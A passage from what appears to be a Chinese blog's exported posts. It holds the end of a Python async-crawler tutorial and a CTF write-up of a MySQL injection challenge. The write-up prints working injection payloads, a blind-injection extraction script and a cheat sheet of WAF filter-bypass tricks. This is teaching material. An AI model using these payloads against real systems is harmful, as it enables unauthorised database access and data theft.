class="title">loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stopped:</span><br><span class="line">        <span class="comment"># 阻塞, 直到一个事件发生</span></span><br><span class="line">        events = selector.select()</span><br><span class="line">        <span class="keyword">for</span> event_key, event_mask <span class="keyword">in</span> events:</span><br><span class="line">            callback = event_key.data</span><br><span class="line">            callback(event_key, event_mask)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(sys.argv[<span class="number">1</span>])):</span><br><span class="line">        urls_todo.append(<span class="string">"/"</span>+str(i))</span><br><span class="line">        crawler = Crawler(<span class="string">"/"</span>+str(i))</span><br><span class="line">        crawler.fetch()</span><br><span class="line">    loop()</span><br><span class="line">    print(<span class="string">"spend time : %s"</span> %(time.time()-start))</span><br></pre></td></tr></table></figure>

<p>监控socket的状态，如果变为可写的，就往里面写数据</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">selector</span><span class="selector-class">.register</span>(<span class="selector-tag">self</span><span class="selector-class">.sock</span><span class="selector-class">.fileno</span>(), <span class="selector-tag">EVENT_WRITE</span>, <span class="selector-tag">self</span><span class="selector-class">.connected</span>)</span><br></pre></td></tr></table></figure>

<p>监控socket的状态，如果变为可读的，就外读数据</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">selector</span><span class="selector-class">.register</span>(<span class="selector-tag">key</span><span class="selector-class">.fd</span>, <span class="selector-tag">EVENT_READ</span>, <span class="selector-tag">self</span><span class="selector-class">.read_response</span>)</span><br></pre></td></tr></table></figure>

<p>测试一下速度：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">➜</span>  <span class="string">python3</span> <span class="number">4.</span><span class="string">py</span> <span class="number">10</span></span><br><span class="line"><span class="attr">spend time :</span> <span class="number">0.03910994529724121</span></span><br><span class="line"><span class="string">➜</span>  <span class="string">python3</span> <span class="number">4.</span><span class="string">py</span> <span class="number">20</span></span><br><span class="line"><span class="attr">spend time :</span> <span class="number">0.04195284843444824</span></span><br></pre></td></tr></table></figure>

<p> 我们看到速度已经有个一个质的飞跃了，但是回调用一些严重的问题，会破坏代码的本来的逻辑结构，造成代码可读性很差。</p>
<p>比如我们有函数 funcA,funcB,funcC三个函数，如果funcC处理的结果依赖于funcB的处理结果，funcB的处理结果依赖于funcA的处理结果，而funcA又是回调的方式调用的，所以就不知道funcA什么时候返回，所以只能将后续的处理都作为callback的方式传入funcA中，让funcA执行完了可以执行funcB，funcB执行完了可以执行funcC，看起来像下面这样：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">funcA(<span class="name">funcB</span>(<span class="name">funcC</span>()))</span><br></pre></td></tr></table></figure>

<p>这就形成了一个链式的回调，跟最初的代码逻辑完全相反，本来的逻辑应该是这样的。</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">funcC(<span class="name">funcB</span>(<span class="name">funcA</span>()))</span><br></pre></td></tr></table></figure>

<p>因为这样的链式回调的出现，导致了理解代码逻辑困难，并且错误处理困难。</p>
<p>有没有方法避免这种地狱式的链式回调的呢？</p>
<h3 id="0x05-改进4-利用生成器"><a href="#0x05-改进4-利用生成器" class="headerlink" title="0x05 改进4-利用生成器"></a>0x05 改进4-利用生成器</h3><p>可以利用python的生成器，把发请求的函数写成一个生成器，然后只监控IO的状态，当IO状态发生改变之后，就给生成器传送值，驱动生成器进行下一步操作，这样就可以避免回调了，具体实现如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">num = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coroutine</span><span class="params">()</span>:</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    sock.setblocking(<span class="number">0</span>)</span><br><span class="line">    address = <span class="keyword">yield</span> sock</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect(address)</span><br><span class="line">    <span class="keyword">except</span> BlockingIOError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    data = <span class="keyword">yield</span></span><br><span class="line">    size = <span class="keyword">yield</span> sock.send(data)</span><br><span class="line">    <span class="keyword">yield</span> sock.recv(size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    inputs = []</span><br><span class="line">    outputs = []</span><br><span class="line">    coros = []</span><br><span class="line">    coro_dict = dict()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        coros.append(coroutine())</span><br><span class="line">        sock = coros[<span class="number">-1</span>].send(<span class="literal">None</span>)   <span class="comment"># 发送一个None值来启动生成器</span></span><br><span class="line">        outputs.append(sock.fileno()) <span class="comment"># </span></span><br><span class="line">        <span class="comment"># print(outputs)</span></span><br><span class="line">        coro_dict[sock.fileno()] = coros[<span class="number">-1</span>]</span><br><span class="line">        coros[<span class="number">-1</span>].send((<span class="string">'www.baidu.com'</span>, <span class="number">80</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r_list,w_list,e_list = select.select(inputs,outputs, ())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> w_list:</span><br><span class="line">            <span class="comment"># print(type(i))</span></span><br><span class="line">            coro_dict[i].send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: Close\r\n\r\n'</span>)</span><br><span class="line">            outputs.remove(i)</span><br><span class="line">            inputs.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r_list:</span><br><span class="line">            coro_dict[i].send(<span class="number">1024</span>)</span><br><span class="line">            inputs.remove(i)</span><br><span class="line">        <span class="keyword">if</span> len(inputs) == len(outputs) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span>   </span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    <span class="comment"># coro.send(b'GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: Close\r\n\r\n')</span></span><br><span class="line">    <span class="comment"># select.select(wait_list, (), ())</span></span><br><span class="line">    <span class="comment"># print(coro.send(1024))</span></span><br><span class="line"></span><br><span class="line">start  = time.time()</span><br><span class="line">main()</span><br><span class="line">print(<span class="string">"spend time : %s"</span> %(time.time()-start))</span><br></pre></td></tr></table></figure>

<p>可以看到把发起请求的函数写成了一个生成器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coroutine</span><span class="params">()</span>:</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    sock.setblocking(<span class="number">0</span>)</span><br><span class="line">    address = <span class="keyword">yield</span> sock</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect(address)</span><br><span class="line">    <span class="keyword">except</span> BlockingIOError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    data = <span class="keyword">yield</span></span><br><span class="line">    size = <span class="keyword">yield</span> sock.send(data)</span><br><span class="line">    <span class="keyword">yield</span> sock.recv(size)</span><br></pre></td></tr></table></figure>

<p>然后监控IO状态，当IO状态发生改变之后，驱动生成器继续运行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r_list,w_list,e_list = select.select(inputs,outputs, ())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> w_list:</span><br><span class="line">            <span class="comment"># print(type(i))</span></span><br><span class="line">            coro_dict[i].send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: Close\r\n\r\n'</span>)</span><br><span class="line">            outputs.remove(i)</span><br><span class="line">            inputs.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r_list:</span><br><span class="line">            coro_dict[i].send(<span class="number">1024</span>)</span><br><span class="line">            inputs.remove(i)</span><br></pre></td></tr></table></figure>

<p>看一下程序执行时间：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">➜</span>  <span class="string">python3</span> <span class="number">5.</span><span class="string">py</span> <span class="number">10</span></span><br><span class="line"><span class="attr">spend time :</span> <span class="number">0.058114051818847656</span></span><br><span class="line"><span class="string">➜</span>  <span class="string">python3</span> <span class="number">5.</span><span class="string">py</span> <span class="number">20</span></span><br><span class="line"><span class="attr">spend time :</span> <span class="number">0.0949699878692627</span></span><br></pre></td></tr></table></figure>

<p>效果貌似非常的棒啊，执行的太快了，但是当我执行300次请求的时候，我就发现问题了，返回的非常慢，。估计原因可能是select是顺序遍历每一个IO描述符的去做状态检查，当IO描述符过多的时候，会导致遍历的速度比较慢，所以造成时间花费很大。</p>
<p>上面的代码看起来太复杂了，能不能简单点呢? 答案是可以。</p>
<h3 id="0x06-改进5-利用python的异步IO库asyncio和aiohttp"><a href="#0x06-改进5-利用python的异步IO库asyncio和aiohttp" class="headerlink" title="0x06 改进5-利用python的异步IO库asyncio和aiohttp"></a>0x06 改进5-利用python的异步IO库asyncio和aiohttp</h3><p>要想看懂asyncio的代码的话，还需要先学习一些基础知识。</p>
<h4 id="yield-from"><a href="#yield-from" class="headerlink" title="yield from"></a>yield from</h4><p>yield我们都用过，用来产生一个生成器，但是yield from是用来干什么的？ </p>
<p>简单的说，就是让生成器进行嵌套，在一个生成器里面可以使用另外一个生成器，允许一个<code>generator</code>生成器将其部分操作委派给另一个生成器。</p>
<p>对于简单的迭代器，<code>yield from iterable</code>本质上等于<code>for item in iterable: yield item</code>的缩写版，如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">yield</span> <span class="keyword">from</span> range(x, <span class="number">0</span>, <span class="number">-1</span>)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">yield</span> <span class="keyword">from</span> range(x)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(g(<span class="number">5</span>))</span><br><span class="line">[<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<p>然而，不同于普通的循环，<code>yield from</code>允许子生成器直接从调用者接收其发送的信息或者抛出调用时遇到的异常，并且返回给委派生产器一个值，如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">accumulate</span><span class="params">()</span>:</span>    <span class="comment"># 子生成器，将传进的非None值累加，传进的值若为None，则返回累加结果</span></span><br><span class="line"><span class="meta">... </span>    tally = <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="meta">... </span>        next = <span class="keyword">yield</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">if</span> next <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> tally</span><br><span class="line"><span class="meta">... </span>        tally += next</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">gather_tallies</span><span class="params">(tallies)</span>:</span>    <span class="comment"># 外部生成器，将累加操作任务委托给子生成器</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="meta">... </span>        tally = <span class="keyword">yield</span> <span class="keyword">from</span> accumulate()</span><br><span class="line"><span class="meta">... </span>        tallies.append(tally)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tallies = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>acc = gather_tallies(tallies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(acc)    <span class="comment"># 使累加生成器准备好接收传入值</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="meta">... </span>    acc.send(i)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>acc.send(<span class="literal">None</span>)    <span class="comment"># 结束第一次累加</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="meta">... </span>    acc.send(i)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>acc.send(<span class="literal">None</span>)    <span class="comment"># 结束第二次累加</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tallies    <span class="comment"># 输出最终结果</span></span><br><span class="line">[<span class="number">6</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure>

<h4 id="await-和-async的使用"><a href="#await-和-async的使用" class="headerlink" title="await 和 async的使用"></a>await 和 async的使用</h4><p>在Python3.5中引入的async和await，可以将他们理解成asyncio.coroutine/yield from的完美替身。当然，从Python设计的角度来说，async/await让协程表面上独立于生成器而存在。</p>
<p>async可以使一个函数变成为一个生成器，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">40</span>]: <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">()</span>:</span></span><br><span class="line">    ...:     <span class="keyword">pass</span></span><br><span class="line">In [<span class="number">41</span>]: <span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">()</span>:</span></span><br><span class="line">    ...:     <span class="keyword">pass</span></span><br><span class="line">In [<span class="number">42</span>]: c = func1()</span><br><span class="line">In [<span class="number">43</span>]: d = func2()</span><br><span class="line">In [<span class="number">44</span>]: c</span><br><span class="line">In [<span class="number">45</span>]: d</span><br><span class="line">Out[<span class="number">45</span>]: &lt;async_generator object func2 at <span class="number">0x110de1b40</span>&gt;</span><br></pre></td></tr></table></figure>

<p>await可以看做是yield from的替身。</p>
<h4 id="异步IO实现代码如下"><a href="#异步IO实现代码如下" class="headerlink" title="异步IO实现代码如下"></a>异步IO实现代码如下</h4><p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">host = <span class="string">'http://www.baidu.com'</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">fetch</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(loop=loop) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            response = <span class="keyword">await</span> response.read()</span><br><span class="line">            <span class="comment"># print(response)</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    start = time.time()</span><br><span class="line">    tasks = [fetch(host) <span class="keyword">for</span> i  <span class="keyword">in</span>  range(int(sys.argv[<span class="number">1</span>]))]</span><br><span class="line">    loop.run_until_complete(asyncio.gather(*tasks))</span><br><span class="line">    print(<span class="string">"spend time : %s"</span> %(time.time()-start))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>代码控</category>
      </categories>
      <tags>
        <tag>code</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>三个白帽子之我是李雷雷，我在寻找韩梅梅系列 1--writeup</title>
    <url>/2016/06/30/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD%E5%AD%90%E4%B9%8B%E6%88%91%E6%98%AF%E6%9D%8E%E9%9B%B7%E9%9B%B7%EF%BC%8C%E6%88%91%E5%9C%A8%E5%AF%BB%E6%89%BE%E9%9F%A9%E6%A2%85%E6%A2%85%E7%B3%BB%E5%88%97%201--writeup/</url>
    <content><![CDATA[<p>这是一个mysql的注入绕过类题目,相对来说是很简单的题目了,由于近来在学习基于正则的waf的绕过技巧,此处就拿此题作引子,引出下面的各种姿势吧.</p>
<a id="more"></a>

<h2><strong>0x1.先看题目:</strong></h2>

<p>[php]<br>&lt;?php</p>
<p>/*</p>
<p>create table baimaozi (intro varchar(40),name varchar(20),nick varchar(20));<br>insert into baimaozi values (md5(‘flag’),’wonderkun’,’wonderkun’);<br>create table <code>flag</code> (<code>flag</code> varchar(32));<br>insert into flag values (md5(‘flag’));</p>
<p>*/</p>
<p>function sanitize($input){<br>$blacklist = array(‘&#39;‘, ‘“‘, ‘/‘, ‘*’, ‘.’);<br>return str_replace($blacklist, ‘’, $input);<br>}<br>$host = “localhost”;<br>$user = “root”;<br>$pass = “123456”;<br>$db = “sangebaimao”;</p>
<p>$connect = mysql_connect($host, $user, $pass) or die(“Unable to connect”);<br>mysql_select_db($db) or die(“Unable to select database”);</p>
<p>$name = isset($_GET[‘name’])?sanitize($_GET[‘name’]):die();</p>
<p>$query = ‘select intro from baimaozi where name=&#39;‘.$name.’&#39; or nick=&#39;‘.$name.’&#39; limit 1’;</p>
<p>echo $query;<br>if (preg_match(‘/[^a-zA-Z0-9_]union[^a-zA-Z0-9_]/i’, $name) || preg_match(‘/^union[^a-zA-Z0-9_]/i’, $name)){<br>echo “not allow”;<br>exit;<br>}</p>
<p>$result = mysql_query($query);</p>
<p>$row = mysql_fetch_array($result);<br>echo $row[0];</p>
<p>[/php]</p>
<p>看了一下第一处过滤:</p>
<p>[php]<br>function sanitize($input){<br> $blacklist = array(‘&#39;‘, ‘“‘, ‘/‘, ‘*’, ‘.’);<br> return str_replace($blacklist, ‘’, $input);<br>}<br>[/php]</p>
<p>可以看到过滤了,单引号,双引号,/,*,还有点;<br>再看下面构造的sql语句:</p>
<p>[php]<br>$query = ‘select intro from baimaozi where name=&#39;‘.$name.’&#39; or nick=&#39;‘.$name.’&#39; limit 1’;<br>[/php]</p>
<p>变量是用单引号包裹的,注入的时候却过滤了单引号,这就出现了一个问题,怎么在没有单引号的情况下闭合掉单引号???</p>
<p>思路是这样的,这个sql语句有4个单引号,其中两个两个配对,总共是两对,既然我们没有办法去输入单引号来闭合他原来的单引号,那么我们是不是可以通过干掉单引号来闭合单引号呢?</p>
<p>观察发现真的没有过滤 ‘&#39;(反斜杠),所以我们可以通过反斜杠去干掉单引号:先传入</p>
<p>[php] <a href="http://127.0.0.1/index.php?name=\[/php]" target="_blank" rel="noopener">http://127.0.0.1/index.php?name=\[/php]</a></p>
<p>打印出来sql语句如下:</p>
<p>[php]select intro from baimaozi where name=’&#39; or nick=’&#39; limit 1[/php]</p>
<p>但是个sql语句报错了,因为第二个单引号被干掉了,第一个单引号和第三个单引号组成了一对,&#39; limit 1 就多余了..所以报错了.<br>所以考虑把&#39; limit 1 注释掉;</p>
<p>[php]<a href="http://127.0.0.1/index.php?name=%23\[/php]" target="_blank" rel="noopener">http://127.0.0.1/index.php?name=%23\[/php]</a></p>
<p>sql语句如下:</p>
<p>[php]select intro from baimaozi where name=’#&#39; or nick=’#&#39; limit 1[/php]</p>
<p><span style="color: #ff0000;">注意:第一个#包裹在单引号中间,没有起到注释的作用,第二个#才是注释.这下就不报错了.</span></p>
<p>[php]</p>
<p>payload:<a href="http://127.0.0.1/index.php?name=%20or%20sleep(3)%23\" target="_blank" rel="noopener">http://127.0.0.1/index.php?name=%20or%20sleep(3)%23\</a>  //成功延时</p>
<p>[/php]</p>
<h2></h2>
<h2>0x2. 可以注入了,但是怎么出数据??</h2>
来看这个正则:

<p>[php]</p>
<p>if (preg_match(‘/[^a-zA-Z0-9_]union[^a-zA-Z0-9_]/i’, $name) || preg_match(‘/^union[^a-zA-Z0-9_]/i’, $name)){<br>echo “not allow”;<br>exit;<br>}</p>
<p>[/php]</p>
<p>如果^用于中括号表达式的第一个字符,表示对字符集取反,用于中括号外面表示以这个字符开头:</p>
<p>[^a-zA-Z0-9_]匹配除了这些字符之外的字符,^union 匹配由union开头的字符.<br>所以想绕过union仅有两种可能:</p>
<ol>
     <li>$name不是以union开头,但是其前或后至少要有一个字符在[a-zA-Z0-9_]的范围之内.</li>
     <li>$name是用union开头,但是其后面的字符在[a-zA-Z0-9_]的范围之内</li>
</ol>
有两种解法:

<p><strong>解法一:绕过union的限制</strong></p>
<p>某位大牛发现了下面方法:</p>
<img class="alignnone size-full wp-image-483" src="/uploads/2016/06/深度截图20160630195653.png" alt="深度截图20160630195653" width="946" height="481" />

<p>看到了吗 ?  由于过滤了’.’,所以第一种payload不能用;</p>
<p>给两种payload:</p>
<p>[php]</p>
<p>payload1:<a href="http://127.0.0.1/index.php?name=or%20name=\Nunion%20select%20flag%20from%20flag%23\" target="_blank" rel="noopener">http://127.0.0.1/index.php?name=or%20name=\Nunion%20select%20flag%20from%20flag%23\</a></p>
<p>payload2:<a href="http://127.0.0.1/index.php?name=or%20name=1E1union%20select%20flag%20from%20flag%23\" target="_blank" rel="noopener">http://127.0.0.1/index.php?name=or%20name=1E1union%20select%20flag%20from%20flag%23\</a></p>
<p>[/php]</p>
<p><strong>解法二:bool盲注</strong></p>
<p>由于比较简单,直接给python代码:</p>
<p>[python]<br>import requests<br>perstr=”0123456789abcdef”<br>flag=’’<br>for i in range(1,33):<br> for j in perstr:<br> url=”<a href="http://127.0.0.1/threebaimao/source1.php?name=" target="_blank" rel="noopener">http://127.0.0.1/threebaimao/source1.php?name=</a> or 1=if(ascii(substring((select flag from flag),{i},1))={j},1,0)%23\“.format(i=str(i),j=ord(j)) </p>
<p> res=requests.get(url)</p>
<p> if “327a6c4304ad5938eaf0efb6cc3e53dc” in res.text :<br> flag+=j<br> break<br> print flag<br>[/python]</p>
<h2>0x3,mysql注入的其他绕过技巧(持续更新中....)</h2>

<h3 id="mysql常用的注释"><a href="#mysql常用的注释" class="headerlink" title="mysql常用的注释"></a>mysql常用的注释</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--+ , /**/ ,  # , -- -, ;%00 , `,</span></span><br></pre></td></tr></table></figure>
<h3 id="mysql-过滤了空格的绕过方法"><a href="#mysql-过滤了空格的绕过方法" class="headerlink" title="mysql 过滤了空格的绕过方法"></a>mysql 过滤了空格的绕过方法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1.可以用()绕过,但是有局限性,括号是用来包围子查询的,因此任何计算出来的结果都可以用括号包围起来</span><br><span class="line">2.%09, %0a, %0b , %0c ,%0d , %a0  (%a0 不会被php的\s匹配,所以有时候有奇效), <span class="comment">/**/</span> ,  </span><br><span class="line">3.用多个空格代替一个空格</span><br><span class="line">4.利用内敛注释:<span class="comment">/*!select*/</span><span class="comment">/*!user*/</span><span class="comment">/*!from*/</span><span class="comment">/*!mysql.user*/</span>;</span><br></pre></td></tr></table></figure>
<h3 id="过滤了-的绕过"><a href="#过滤了-的绕过" class="headerlink" title="过滤了 = 的绕过:"></a>过滤了 = 的绕过:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1.用函数绕过,: strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1),  greatest()</span><br><span class="line">2.用 &gt; , &lt;  </span><br><span class="line">3. like ,  regexp , in </span><br><span class="line">in 的用法 :<span class="keyword">select</span> <span class="string">'user'</span> <span class="keyword">in</span> (<span class="string">'user'</span>);    字符串都是可以用16进制代替的.</span><br></pre></td></tr></table></figure>
<h3 id="等价替换的一些函数"><a href="#等价替换的一些函数" class="headerlink" title="等价替换的一些函数"></a>等价替换的一些函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">hex</span><span class="params">()</span></span> ,  bin()  =&gt; ascii()</span><br><span class="line"><span class="function"><span class="title">sleep</span><span class="params">()</span></span>      =&gt;  benchmark() </span><br><span class="line"><span class="function"><span class="title">mid</span><span class="params">()</span></span>  ,  substr()   =&gt;  substring()</span><br></pre></td></tr></table></figure>
<h3 id="绕过逗号的情况"><a href="#绕过逗号的情况" class="headerlink" title="绕过逗号的情况"></a>绕过逗号的情况</h3><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">select   substr(<span class="name">user</span>()from(<span class="number">1</span>)for(<span class="number">1</span>)) <span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h3 id="绕过某些关键字的过滤"><a href="#绕过某些关键字的过滤" class="headerlink" title="绕过某些关键字的过滤"></a>绕过某些关键字的过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> =&gt; sel%<span class="number">00</span>ect   <span class="comment"># 在ctf中出现好几次了,但是这不是通法,至少在我的mysql中是不行的.</span></span><br><span class="line"><span class="keyword">select</span> =&gt; <span class="comment">/*!select*/</span>  <span class="comment"># may be  可以绕过啊</span></span><br></pre></td></tr></table></figure>
<h3 id="order-by-子句的注入"><a href="#order-by-子句的注入" class="headerlink" title="order by 子句的注入:"></a>order by 子句的注入:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1. <span class="keyword">select</span> <span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user  <span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">case</span><span class="comment">/**/</span><span class="keyword">when</span>((<span class="number">1</span>=<span class="number">2</span>))<span class="keyword">then</span>(<span class="keyword">user</span>)<span class="keyword">else</span>(host)<span class="keyword">end</span>);</span><br><span class="line"></span><br><span class="line">2. 报错注入 :  <span class="keyword">select</span> <span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user  <span class="keyword">order</span> <span class="keyword">by</span> (extractvalue(<span class="keyword">user</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>(),<span class="number">0x3a</span>))); </span><br><span class="line"></span><br><span class="line">3. <span class="keyword">select</span> <span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user  <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">if</span>(<span class="number">1</span>,<span class="keyword">user</span>,host);  跟第一个差不多</span><br><span class="line"></span><br><span class="line">4. <span class="keyword">select</span> <span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user  <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">1</span>*(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> mysql.user) <span class="keyword">end</span> )=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user  <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">1</span>*(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> mysql.user) <span class="keyword">end</span> )=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h3 id="mysql-的一个黑魔法"><a href="#mysql-的一个黑魔法" class="headerlink" title="mysql 的一个黑魔法"></a>mysql 的一个黑魔法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;x <span class="keyword">user</span>&#125; <span class="keyword">from</span> &#123;x mysql.user&#125;;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span>=~<span class="number">18446744073709551615</span>;</span><br><span class="line"><span class="keyword">select</span>  <span class="keyword">id</span> <span class="keyword">from</span> ctf.user <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">sleep</span>(<span class="keyword">ascii</span>(<span class="keyword">mid</span>(<span class="keyword">user</span>()<span class="keyword">from</span>(<span class="number">2</span>)<span class="keyword">for</span>(<span class="number">1</span>)))=<span class="number">109</span>)); (没有用到空格,逗号,大于或者小于号,非常实用!)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wirte-up</tag>
      </tags>
  </entry>
  <entry>
    <title>从35c3CTF的filemanager题目中学到的一个小tips</title>
    <url>/2018/12/30/%E4%BB%8E35c3CTF%E7%9A%84filemanager%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8Ftips/</url>
    <content><![CDATA[<p>再一次被国际赛血虐…. 真是太菜了。回到正题上来，看一次35c3的filemanger题目。<br>题目应该还没有关：</p>
<a id="more"></a>

